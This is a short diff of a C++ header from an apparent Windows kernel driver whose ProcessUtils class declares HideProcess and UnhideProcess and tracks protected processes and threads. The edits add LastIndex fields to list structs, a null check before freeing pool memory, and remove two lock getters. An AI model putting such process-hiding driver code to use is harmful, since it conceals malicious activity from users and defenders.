@@ -19,6 +19,7 @@ constexpr SIZE_T PROCESS_VM_OPERATION = 0x8;
 
 // Structs.
 struct ProtectedProcessesList {
+	ULONG LastIndex;
 	ULONG PidsCount;
 	ULONG Processes[MAX_PIDS];
 };
@@ -39,6 +40,7 @@ struct HiddenProcessListItem {
 };
 
 struct HiddenProcessList {
+	ULONG LastIndex;
 	ULONG PidsCount;
 	HiddenProcessListItem Processes[MAX_PIDS];
 };
@@ -55,6 +57,7 @@ struct ProtectedThread {
 };
 
 struct ThreadsList {
+	ULONG LastIndex;
 	ULONG TidsCount;
 	ULONG Threads[MAX_TIDS];
 };
@@ -78,7 +81,8 @@ public:
 	}
 
 	void operator delete(void* p) {
-		ExFreePoolWithTag(p, DRIVER_TAG);
+		if (p)
+			ExFreePoolWithTag(p, DRIVER_TAG);
 	}
 
 	ProcessUtils();
@@ -102,8 +106,6 @@ public:
 	NTSTATUS UnhideProcess(ULONG pid);
 	NTSTATUS HideProcess(ULONG pid);
 
-	FastMutex GetProcessesLock() { return this->ProcessesLock; }
-	FastMutex GetThreadsLock() { return this->ThreadsLock; }
 	ULONG GetProtectedProcessesCount() { return this->ProtectedProcesses.PidsCount; }
 	ULONG GetProtectedThreadsCount() { return this->ProtectedThreads.TidsCount; }
 };
